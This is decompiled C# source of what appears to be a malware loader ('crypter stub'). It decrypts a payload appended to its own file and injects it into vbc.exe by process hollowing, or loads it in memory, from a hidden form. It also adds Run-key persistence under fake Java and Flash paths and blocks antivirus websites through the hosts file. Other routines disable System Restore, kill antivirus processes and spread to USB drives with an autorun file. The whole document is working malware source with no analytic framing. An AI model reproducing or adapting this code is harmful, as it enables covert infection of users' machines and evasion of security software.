using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[DesignerGenerated]
public class form1 : Form
{
	public class GClass0
	{
		[DebuggerNonUserCode]
		public GClass0()
		{
		}

		public static void smethod_0()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\JUpdate.exe";
				if (File.Exists(text))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(text);
				}
				File.Copy(Application.get_ExecutablePath(), text);
				((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_1()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\";
				((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + fileName, true);
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(fileName, text);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_2()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (File.Exists(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
				}
				File.Copy(Application.get_ExecutablePath(), folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Winlogon", (object)(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName), RegistryValueKind.String);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_3()
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_4()
		{
			try
			{
				string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				string value = "\n 127.0.0.1 www.virustotal.com";
				string text = "\n 127.0.0.1 www.bitdefender.com";
				string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
				string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
				streamWriter.Write(value);
				streamWriter.Write("\r\n" + text);
				streamWriter.Write("\r\n" + text2);
				streamWriter.Write("\r\n" + text3);
				streamWriter.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_5()
		{
			try
			{
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_6()
		{
			try
			{
				string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_7()
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			checked
			{
				int num = logicalDrives.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					DriveInfo driveInfo = new DriveInfo(logicalDrives[num2]);
					if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
					{
						try
						{
							if (!File.Exists(logicalDrives[num2] + "CheckUSB.exe"))
							{
								string fileName = Path.GetFileName(Application.get_ExecutablePath());
								File.Copy(fileName, logicalDrives[num2] + "CheckUSB", overwrite: true);
								((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText(logicalDrives[num2] + "Boot.inf", "[autorun]" + Environment.NewLine + "open=" + logicalDrives[num2] + "CheckUSB" + Environment.NewLine + "shellexecute=" + logicalDrives[num2], true);
								File.SetAttributes(logicalDrives[num2] + "CheckUSB", FileAttributes.Hidden);
								File.SetAttributes(logicalDrives[num2] + "Boot.inf", FileAttributes.Hidden);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					num2++;
				}
			}
		}

		public static void smethod_8()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "outpost", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_9()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "npfmsg", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_10()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "bdagent", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_11()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "egui", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_12()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "zlclient", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}
	}

	public class GClass1
	{
		public class GClass2
		{
			[DebuggerNonUserCode]
			public GClass2()
			{
			}

			public static string smethod_0(string string_0, string string_1)
			{
				return Encoding.Default.GetString(smethod_1(Encoding.Default.GetBytes(string_0), Encoding.Default.GetBytes(string_1)));
			}

			public static byte[] smethod_1(byte[] byte_0, byte[] byte_1)
			{
				int num = checked(byte_0.Length - 1);
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					byte_0[num2] = (byte)(checked((byte)unchecked(checked(unchecked((int)byte_0[num2]) + unchecked((int)byte_0[checked(num2 + 1) % byte_0.Length])) % 256)) ^ byte_1[num2 % byte_1.Length]);
					num2 = checked(num2 + 1);
				}
				return byte_0;
			}

			public static string smethod_2(string string_0, string string_1)
			{
				return Encoding.Default.GetString(smethod_3(Encoding.Default.GetBytes(string_0), Encoding.Default.GetBytes(string_1)));
			}

			public static byte[] smethod_3(byte[] byte_0, byte[] byte_1)
			{
				checked
				{
					for (int i = byte_0.Length - 1; i >= 0; i += -1)
					{
						byte_0[i] = (byte)unchecked(checked((byte_0[i] ^ byte_1[unchecked(i % byte_1.Length)]) - unchecked((int)byte_0[checked(i + 1) % byte_0.Length]) + 256) % 256);
					}
					return byte_0;
				}
			}
		}

		[DebuggerNonUserCode]
		public GClass1()
		{
		}

		public static string smethod_0(string string_0, string string_1, bool bool_0)
		{
			byte[] array = Convert.FromBase64String(string_0);
			byte[] key;
			if (bool_0)
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_1));
			}
			else
			{
				key = Encoding.UTF8.GetBytes(string_1);
			}
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = key;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes);
		}

		public static string smethod_1(string string_0, string string_1)
		{
			int num = 0;
			int num2 = 0;
			StringBuilder stringBuilder = new StringBuilder();
			string empty = string.Empty;
			int[] array = new int[257];
			int[] array2 = new int[257];
			int length = string_1.Length;
			int location = 0;
			while (location <= 255)
			{
				char c = string_1.Substring(location % length, 1).ToCharArray()[0];
				array2[location] = Strings.Asc(c);
				array[location] = location;
				Math.Max(Interlocked.Increment(ref location), checked(location - 1));
			}
			int num3 = 0;
			int location2 = 0;
			while (location2 <= 255)
			{
				num3 = checked(num3 + array[location2] + array2[location2]) % 256;
				int num4 = array[location2];
				array[location2] = array[num3];
				array[num3] = num4;
				Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
			}
			location = 1;
			while (location <= string_0.Length)
			{
				int num5 = 0;
				num = checked(num + 1) % 256;
				num2 = checked(num2 + array[num]) % 256;
				num5 = array[num];
				array[num] = array[num2];
				array[num2] = num5;
				int num6 = array[checked(array[num] + array[num2]) % 256];
				checked
				{
					char c2 = string_0.Substring(location - 1, 1).ToCharArray()[0];
					num5 = Strings.Asc(c2);
					int num7 = num5 ^ num6;
					stringBuilder.Append(Strings.Chr(num7));
					Math.Max(Interlocked.Increment(ref location), location - 1);
				}
			}
			empty = stringBuilder.ToString();
			stringBuilder.Length = 0;
			return empty;
		}

		public static object smethod_2(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_1, salt);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
			try
			{
				byte[] array = Convert.FromBase64String(string_0);
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.Close();
				string_0 = Encoding.UTF8.GetString(memoryStream.ToArray());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return string_0;
		}

		public static string smethod_3(string string_0, string string_1)
		{
			string text = "";
			checked
			{
				long num = (long)Math.Round((double)Strings.Len(string_1) / 2.0);
				long num2 = 1L;
				while (true)
				{
					long num3 = num2;
					long num4 = num;
					if (num3 > num4)
					{
						break;
					}
					int num5 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_1, (int)(2L * num2 - 1L), 2)));
					int num6 = Strings.Asc(Strings.Mid(string_0, (int)(unchecked(num2 % Strings.Len(string_0)) + 1L), 1));
					text += Conversions.ToString(Strings.Chr(num5 ^ num6));
					num2++;
				}
				return text;
			}
		}
	}

	public class GClass3
	{
		[DebuggerNonUserCode]
		public GClass3()
		{
		}

		public static bool smethod_0()
		{
			if (Operators.CompareString(Environment.GetEnvironmentVariable("ProgramW6432"), "", false) != 0)
			{
				return true;
			}
			return false;
		}
	}

	public class GClass4
	{
		public struct GStruct0
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			public GStruct1 gstruct1_0;

			public uint uint_7;

			public uint uint_8;

			public uint uint_9;

			public uint uint_10;

			public uint uint_11;

			public uint uint_12;

			public uint uint_13;

			public uint uint_14;

			public uint uint_15;

			public uint uint_16;

			public uint uint_17;

			public uint uint_18;

			public uint uint_19;

			public uint uint_20;

			public uint uint_21;

			public uint uint_22;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] byte_0;
		}

		public struct GStruct1
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] byte_0;

			public uint uint_7;
		}

		public struct GStruct2
		{
			public uint uint_0;

			public uint uint_1;
		}

		public struct GStruct3
		{
			public byte byte_0;

			public GStruct2 gstruct2_0;

			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			public uint uint_7;
		}

		public struct GStruct4
		{
			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public int int_0;

			public int int_1;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct GStruct5
		{
			public int int_0;

			public string string_0;

			public string string_1;

			public string string_2;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;

			public int int_5;

			public int int_6;

			public int int_7;

			public int int_8;

			public short short_0;

			public short short_1;

			public int int_9;

			public int int_10;

			public int int_11;

			public int int_12;
		}

		public struct GStruct6
		{
			public int int_0;

			public IntPtr intptr_0;

			public int int_1;
		}

		public struct GStruct7
		{
			public ushort ushort_0;

			public ushort ushort_1;

			public ushort ushort_2;

			public ushort ushort_3;

			public ushort ushort_4;

			public ushort ushort_5;

			public ushort ushort_6;

			public ushort ushort_7;

			public ushort ushort_8;

			public ushort ushort_9;

			public ushort ushort_10;

			public ushort ushort_11;

			public ushort ushort_12;

			public ushort ushort_13;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
			public ushort[] ushort_14;

			public ushort ushort_15;

			public ushort ushort_16;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
			public ushort[] ushort_17;

			public int int_0;
		}

		public struct GStruct8
		{
			public uint uint_0;

			public GStruct9 gstruct9_0;

			public GStruct10 gstruct10_0;
		}

		public struct GStruct9
		{
			public ushort ushort_0;

			public ushort ushort_1;

			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public ushort ushort_2;

			public ushort ushort_3;
		}

		public struct GStruct10
		{
			public ushort ushort_0;

			public byte byte_0;

			public byte byte_1;

			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			public uint uint_7;

			public uint uint_8;

			public ushort ushort_1;

			public ushort ushort_2;

			public ushort ushort_3;

			public ushort ushort_4;

			public ushort ushort_5;

			public ushort ushort_6;

			public uint uint_9;

			public uint uint_10;

			public uint uint_11;

			public uint uint_12;

			public ushort ushort_7;

			public ushort ushort_8;

			public uint uint_13;

			public uint uint_14;

			public uint uint_15;

			public uint uint_16;

			public uint uint_17;

			public uint uint_18;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public GStruct11[] gstruct11_0;
		}

		public struct GStruct11
		{
			public uint uint_0;

			public uint uint_1;
		}

		public delegate bool GDelegate0(string name, string command, ref GStruct6 process, ref GStruct6 thread, bool inherit, uint flags, IntPtr system, string current, [In] ref GStruct5 startup, out GStruct4 info);

		public delegate bool GDelegate1(IntPtr process, int address, byte[] buffer, int size, out int written);

		public delegate int GDelegate2(IntPtr process, int address, ref int buffer, int size, ref int read);

		public delegate IntPtr GDelegate3(IntPtr process, int address, uint size, uint type, uint protect);

		public delegate long GDelegate4(IntPtr process, int address);

		public delegate uint GDelegate5(IntPtr thread);

		public delegate bool GDelegate6(IntPtr thread, ref GStruct0 context);

		public delegate bool GDelegate7(IntPtr thread, ref GStruct0 context);

		public const long long_0 = 512L;

		public const long long_1 = 64L;

		public const long long_2 = 128L;

		public const long long_3 = 32L;

		public const long long_4 = 16L;

		public const long long_5 = 8L;

		public const long long_6 = 1L;

		public const long long_7 = 4L;

		public const uint uint_0 = 2u;

		[DebuggerNonUserCode]
		public GClass4()
		{
		}

		public static void smethod_0(byte[] byte_0, string string_0)
		{
			GStruct0 context = default(GStruct0);
			GStruct4 info = default(GStruct4);
			GStruct5 startup = default(GStruct5);
			GStruct6 process = default(GStruct6);
			GStruct6 thread = default(GStruct6);
			GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
			int num = gCHandle.AddrOfPinnedObject().ToInt32();
			object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(GStruct7).GetType());
			GStruct7 gStruct = default(GStruct7);
			GStruct7 gStruct2 = ((obj != null) ? ((GStruct7)obj) : gStruct);
			gCHandle.Free();
			GDelegate0 gDelegate = smethod_1<GDelegate0>("kernel32", "CreateProcessA");
			GDelegate6 gDelegate2 = smethod_1<GDelegate6>("kernel32", "GetThreadContext");
			GDelegate2 gDelegate3 = smethod_1<GDelegate2>("kernel32", "ReadProcessMemory");
			GDelegate1 gDelegate4 = smethod_1<GDelegate1>("kernel32", "WriteProcessMemory");
			GDelegate4 gDelegate5 = smethod_1<GDelegate4>("ntdll", "ZwUnmapViewOfSection");
			GDelegate3 gDelegate6 = smethod_1<GDelegate3>("kernel32", "VirtualAllocEx");
			GDelegate7 gDelegate7 = smethod_1<GDelegate7>("kernel32", "SetThreadContext");
			GDelegate5 gDelegate8 = smethod_1<GDelegate5>("kernel32", "ResumeThread");
			IntPtr system = default(IntPtr);
			if (0 - (gDelegate(null, string_0, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
			{
				return;
			}
			GStruct8 gStruct3 = default(GStruct8);
			IntPtr ptr = new IntPtr(checked(num + gStruct2.int_0));
			object? obj2 = Marshal.PtrToStructure(ptr, gStruct3.GetType());
			GStruct8 gStruct4 = default(GStruct8);
			gStruct3 = ((obj2 != null) ? ((GStruct8)obj2) : gStruct4);
			startup.int_0 = Strings.Len((object)startup);
			context.uint_0 = 65539u;
			if ((((long)gStruct3.uint_0 != 17744L) | (gStruct2.ushort_0 != 23117)) || 0 - (gDelegate(null, string_0, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
			{
				return;
			}
			gDelegate2(info.intptr_1, ref context);
			IntPtr intptr_ = info.intptr_0;
			checked
			{
				int address = (int)(unchecked((long)context.uint_13) + 8L);
				long num2 = default(long);
				int buffer = (int)num2;
				int read = 0;
				gDelegate3(intptr_, address, ref buffer, 4, ref read);
				num2 = buffer;
				gDelegate5(info.intptr_0, (int)num2);
				uint num3 = (uint)(int)gDelegate6(info.intptr_0, (int)gStruct3.gstruct10_0.uint_6, gStruct3.gstruct10_0.uint_10, 12288u, 4u);
				if (unchecked((long)num3) == 0L)
				{
					return;
				}
				IntPtr intptr_2 = info.intptr_0;
				int address2 = (int)num3;
				int size = (int)gStruct3.gstruct10_0.uint_11;
				uint num4 = default(uint);
				read = (int)num4;
				gDelegate4(intptr_2, address2, byte_0, size, out read);
				num4 = (uint)read;
				long num5 = gStruct2.int_0 + 248;
				int num6 = unchecked((int)gStruct3.gstruct9_0.ushort_1) - 1;
				int num7 = 0;
				GStruct3 gStruct5 = default(GStruct3);
				GStruct3 gStruct6 = default(GStruct3);
				while (true)
				{
					int num8 = num7;
					int num9 = num6;
					if (num8 > num9)
					{
						break;
					}
					ptr = new IntPtr(num + num5 + num7 * 40);
					object? obj3 = Marshal.PtrToStructure(ptr, gStruct5.GetType());
					gStruct5 = ((obj3 != null) ? ((GStruct3)obj3) : gStruct6);
					byte[] array = new byte[(int)gStruct5.uint_1 + 1];
					int num10 = (int)(unchecked((long)gStruct5.uint_1) - 1L);
					int num11 = 0;
					while (true)
					{
						int num12 = num11;
						num9 = num10;
						if (num12 > num9)
						{
							break;
						}
						array[num11] = byte_0[(int)(unchecked((long)gStruct5.uint_2) + unchecked((long)num11))];
						num11++;
					}
					IntPtr intptr_3 = info.intptr_0;
					int address3 = (int)(num3 + gStruct5.uint_0);
					int size2 = (int)gStruct5.uint_1;
					read = (int)num4;
					gDelegate4(intptr_3, address3, array, size2, out read);
					num4 = (uint)read;
					num7++;
				}
				byte[] bytes = BitConverter.GetBytes(num3);
				IntPtr intptr_4 = info.intptr_0;
				int address4 = (int)(unchecked((long)context.uint_13) + 8L);
				read = (int)num4;
				gDelegate4(intptr_4, address4, bytes, 4, out read);
				num4 = (uint)read;
				context.uint_16 = num3 + gStruct3.gstruct10_0.uint_3;
				gDelegate7(info.intptr_1, ref context);
				gDelegate8(info.intptr_1);
			}
		}

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

		private static T smethod_1<T>(string string_0, string string_1)
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
		}
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private const string string_0 = "BXkAZzqW2N047kvRtKlKHitam8Dfd24Yp1yTaWCyZOTD3pSMTSnBZRcxJRQspkt2cv724s";

	private string string_1;

	private string string_2;

	private bool bool_0;

	public form1()
	{
		((Form)this).add_Load((EventHandler)form1_Load);
		lock (list_0)
		{
			list_0.Add(new WeakReference(this));
		}
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		bool_0 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(1, 1);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void form1_Load(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Class9.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "BXkAZzqW2N047kvRtKlKHitam8Dfd24Yp1yTaWCyZOTD3pSMTSnBZRcxJRQspkt2cv724s", -1, (CompareMethod)0);
		string text = array[1];
		string text2 = array[2];
		string text3 = array[6];
		string text4 = array[10];
		string text5 = array[11];
		string text6 = array[12];
		string text7 = array[13];
		string text8 = array[14];
		string text9 = array[15];
		string text10 = array[16];
		string text11 = array[17];
		string text12 = array[20];
		try
		{
			if (Operators.CompareString(text7, "Activated", false) == 0)
			{
				MessageBox.Show(text8, text9, (MessageBoxButtons)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text5, "own", false) == 0)
		{
			text5 = Process.GetCurrentProcess().MainModule!.FileName;
		}
		if (Operators.CompareString(text, "true", false) == 0)
		{
			GClass0.smethod_0();
		}
		if (Operators.CompareString(text, "star2", false) == 0)
		{
			GClass0.smethod_1();
		}
		if (Operators.CompareString(text, "star3", false) == 0)
		{
			GClass0.smethod_2();
		}
		if (Operators.CompareString(text3, "true", false) == 0)
		{
			GClass0.smethod_3();
		}
		if (Operators.CompareString(text10, "true", false) == 0)
		{
			GClass0.smethod_5();
		}
		if (Operators.CompareString(text11, "true", false) == 0)
		{
			GClass0.smethod_6();
		}
		if (Operators.CompareString(text4, "true", false) == 0)
		{
			GClass0.smethod_8();
			GClass0.smethod_9();
			GClass0.smethod_10();
			GClass0.smethod_11();
			GClass0.smethod_12();
		}
		if (Operators.CompareString(text6, "true", false) == 0)
		{
			GClass0.smethod_7();
		}
		if (Operators.CompareString(text12, "des", false) == 0)
		{
			string_1 = GClass1.smethod_0(array[3], text2, bool_0: true);
		}
		else
		{
			string_1 = GClass1.smethod_1(array[3], text2);
		}
		if (Operators.CompareString(text12, "Rijndael", false) == 0)
		{
			string_1 = Conversions.ToString(GClass1.smethod_2(array[3], text2));
		}
		if (Operators.CompareString(text12, "Stairs", false) == 0)
		{
			string_1 = GClass1.GClass2.smethod_2(array[3], text2);
		}
		bool flag = GClass3.smethod_0();
		if (Operators.CompareString(array[7], "NULL", false) != 0)
		{
			try
			{
				byte[] bytes2 = method_3(array[7]);
				File.WriteAllBytes(string_2 + array[8], bytes2);
				Process.Start(string_2 + array[8]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			try
			{
				if (method_1())
				{
					Thread thread = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(GClass1.smethod_0(array[3], text2, bool_0: true));
					((Form)this).Close();
				}
				else
				{
					Thread thread2 = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread2.TrySetApartmentState(ApartmentState.STA);
					byte[] bytes3 = Encoding.Default.GetBytes(string_1);
					try
					{
						thread2.Start(GClass1.smethod_0(string_1, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", bool_0: true));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						GClass4.smethod_0(bytes3, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Process.GetCurrentProcess().Kill();
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			return;
		}
		try
		{
			if (method_1())
			{
				Thread thread3 = new Thread(delegate(object object_0)
				{
					method_2(Conversions.ToString(object_0));
				});
				thread3.TrySetApartmentState(ApartmentState.STA);
				thread3.Start(GClass1.smethod_0(array[3], text2, bool_0: true));
				((Form)this).Close();
			}
			else
			{
				new GClass4();
				byte[] bytes4 = Encoding.Default.GetBytes(string_1);
				GClass4.smethod_0(bytes4, text5);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			Process.GetCurrentProcess().Kill();
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(byte[] byte_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	private bool method_1()
	{
		if (string_1.Contains("</assembly>"))
		{
			string[] array = Strings.Split(string_1, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public void method_2(string string_3)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(string_3);
		Thread thread = new Thread(delegate(object object_0)
		{
			method_0((byte[])object_0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	public byte[] method_3(string string_3)
	{
		if (string_3 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(string_3);
	}

